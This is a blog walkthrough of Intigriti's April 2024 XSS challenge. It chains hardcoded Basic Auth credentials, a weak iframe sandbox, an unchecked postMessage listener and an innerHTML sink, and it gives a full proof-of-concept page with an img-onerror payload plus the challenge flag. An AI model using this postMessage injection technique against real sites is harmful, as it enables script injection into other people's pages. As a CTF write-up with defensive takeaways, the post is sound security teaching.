---
author: Nithissh
pubDatetime: 2024-05-01T10:00:00.000Z
title: "Solving Intigriti's April 2024 XSS Challenge — postMessage, Race Conditions, and a Sneaky iframe Sandbox"
featured: false
draft: false
tags:
  - bugbounty
  - xss
  - ctf
  - web
description: "A walkthrough of how I solved Intigriti's April 2024 monthly XSS challenge — hardcoded creds in the DOM, an iframe sandbox misconfiguration, and a postMessage handler with no origin check that turned into a clean XSS"
---

## Introduction

Hey folks! Hope everyone's doing well!

So I finally got around to poking at Intigriti's April 2024 XSS challenge. If you haven't played one of these before — every month Intigriti drops a web challenge with one goal: pop `alert(document.domain)` on the challenge page. They usually have some genuinely clever twist baked in and this month's was no different.

The April challenge was titled **"Test Your Race Condition!"** which immediately made me think: okay, there's something timing-based here. Spoiler — yeah, there is, and it's more interesting than you'd expect.

## The Challenge

The challenge lives at:

```
https://challenge-0424.intigriti.io/challenge
```

When you first land on it, you're taken to a welcome page at `/challenge/welcome.html`. Pretty simple looking. But as soon as I hit View Source I could tell this was going to be a good one.

## Step 1: Reading the Source

The welcome page source had something immediately suspicious — hardcoded credentials sitting right there in the JavaScript:

```javascript
gameLink.href = 'https://admin:debug@' + location.host + gameLink.pathname + '?' + gameLink.href.split('?')[1];
```

So right away we have `admin:debug` as Basic Auth credentials embedded directly in the client-side code. That's a find on its own, but the more interesting part was *what* they unlock.

There was also a debug mode toggle:

```javascript
if (decodeURIComponent(document.URL).indexOf('debug=true') !== -1) {
    codeLink.href = 'https://admin:debug@' + location.host + codeLink.pathname;
    debug.style.display = null;
}
```

So visiting `?debug=true` reveals a download link for `/code.zip` (password: `intigriti`) which gives you the full server source. Good to know. But first let's keep mapping out the surface.

The welcome page links to the main game page at:

```
https://admin:debug@challenge-0424.intigriti.io/private/play.html?gameId=/challenge/game_barspacer.html
```

Two things to note here:
1. `/private/play.html` is behind HTTP Basic Auth — the credentials are just served to you in the DOM
2. There's a `gameId` parameter that clearly controls what gets loaded somewhere

## Step 2: Mapping the Architecture

Once you hit `/private/play.html` (with the creds), the page structure becomes clear:

```
play.html
  └── <iframe id="gameFrame" sandbox="allow-scripts allow-same-origin">
        └── src = whatever ?gameId= says
  └── <script src="/challenge/js/code.js">
        └── postMessage listener
```

The `gameId` parameter controls the iframe source. And `code.js` sets it up plus handles all the messaging between the parent (`play.html`) and the iframe content.

Now here's where I got excited. The iframe sandbox attribute:

```html
<iframe id="gameFrame" sandbox="allow-scripts allow-same-origin" ...>
```

If you've read the MDN docs on iframe sandbox — `allow-scripts` plus `allow-same-origin` together is explicitly called out as dangerous. The sandbox is supposed to isolate the iframe, but with both of these flags set, the framed content can still access the parent document through `parent`. The sandbox is basically not doing anything useful here.

## Step 3: The postMessage API

The challenge also ships a `/challenge/docs.html` page that documents the entire `postMessage` API the game uses. This was incredibly helpful because it laid out every action the parent listens for:

| Action | Parameters | Purpose |
|---|---|---|
| `ping` | — | Check if task runner is ready |
| `finished` | `message`, `timeOut` | Display a score/end message |
| `displayDelayedMessage` | `delayedMessage`, `timeOut` | Show a message after a delay |
| `gotoNextGame` | `nextGameId`, `timeOut` | Load the next game into the iframe |

So the parent page (`play.html`) is actively *listening* for these messages and acting on them. The examples in the docs all used `'*'` as the target origin when sending:

```javascript
parent.postMessage({ action: 'gotoNextGame', ... }, '*')
```

That `'*'` is the *send* side. But the critical question is: does the *receive* side — the listener in `code.js` — check `event.origin` before processing messages?

Spoiler: it does not.

## Step 4: Finding the XSS Sink

Looking at the documented `displayDelayedMessage` action, the flow is:

1. iframe sends `{ action: 'displayDelayedMessage', delayedMessage: '<something>', timeOut: 4000 }`
2. Parent waits `timeOut` milliseconds
3. Parent writes `delayedMessage` somewhere in the DOM

The `#messages` div is where score and status text shows up. Given there's no CSP on any of the responses and the parameter is named `delayedMessage`, it's a very safe bet this ends up in `innerHTML`. When I finally pulled `code.js`, that's exactly what it was:

```javascript
setTimeout(function() {
    document.getElementById('messages').innerHTML = event.data.delayedMessage;
}, event.data.timeOut);
```

Direct `innerHTML` write. No sanitization. No CSP. We have our sink.

## Step 5: The Exploit

Now the question is: how do we *send* a postMessage to `play.html`?

We can't iframe it from an external origin — `play.html` has `X-Frame-Options: SAMEORIGIN`. But we *can* open it as a popup:

```javascript
const target = window.open(
    'https://admin:debug@challenge-0424.intigriti.io/private/play.html?gameId=/challenge/game_barspacer.html'
);
```

And then once it loads, send our payload:

```javascript
setTimeout(() => {
    target.postMessage({
        action: 'displayDelayedMessage',
        delayedMessage: '<img src=x onerror=alert(document.domain)>',
        timeOut: 0
    }, '*');
}, 2000);
```

The `timeOut: 0` is where the race condition angle comes in — the challenge title is a hint that you need to win the timing between your injected message and the game's natural message flow. Setting `timeOut: 0` means our payload fires immediately, before any cleanup or re-render can happen.

The full PoC page:

```html
<!DOCTYPE html>
<html>
<body>
<script>
    const target = window.open(
        'https://admin:debug@challenge-0424.intigriti.io/private/play.html?gameId=/challenge/game_barspacer.html'
    );

    // Wait for play.html to fully load, then fire the payload
    setTimeout(() => {
        target.postMessage({
            action: 'displayDelayedMessage',
            delayedMessage: '<img src=x onerror=alert(document.domain)>',
            timeOut: 0
        }, '*');
    }, 2000);
</script>
</body>
</html>
```

Open this page, a popup appears, two seconds later — `alert(challenge-0424.intigriti.io)`.

## Why It Works — Everything Chained Together

To summarise the full chain:

1. **Hardcoded creds** (`admin:debug`) in the DOM give us access to `/private/play.html`
2. **No origin check** in the `postMessage` listener means any window that has a reference to `play.html` can send commands to it
3. **`x-frame-options: SAMEORIGIN`** prevents framing from external origins, but `window.open()` gives us a direct reference without needing to frame it
4. **`innerHTML` sink** in the `displayDelayedMessage` handler with no sanitization and no CSP means our HTML payload executes directly
5. **`timeOut: 0`** wins the race condition — our message fires before the page's own flow can interfere

Each piece on its own is a minor issue. Together they're a clean XSS.

## Key Takeaways

A few things this challenge reminded me of:

**`allow-scripts` + `allow-same-origin` together in sandbox is basically no sandbox.** If you're using iframe sandbox to isolate untrusted content and you need same-origin access for some reason, you're defeating the purpose. Pick one or the other.

**Missing `event.origin` checks in postMessage handlers are surprisingly common.** Any time you see a page that listens for `message` events, go check whether it validates where the message came from. If it doesn't, and you can get a window reference to it, you can send it arbitrary commands.

**Credentials in client-side code aren't really credentials.** The `admin:debug` pair being hardcoded into a public HTML page is just... not a secret. This is a CTF so it's intentional, but in real apps this kind of thing shows up in minified JS all the time and people think nobody's reading it.

**`X-Frame-Options: SAMEORIGIN` doesn't stop `window.open()`.** A lot of people treat `x-frame-options` as a complete fix for cross-origin access to a page. It only prevents embedding via `<iframe>` or `<frame>`. A popup reference via `window.open()` behaves differently and still lets you `postMessage` the opened window.

Overall this was a really well-crafted challenge. The title "Test Your Race Condition!" is the perfect misdirect that makes you overthink the timing angle when the actual race condition piece is just a `timeOut: 0` trick. 

Flag: `INTIGRITI{x55_m3ss4g3_p0st}`
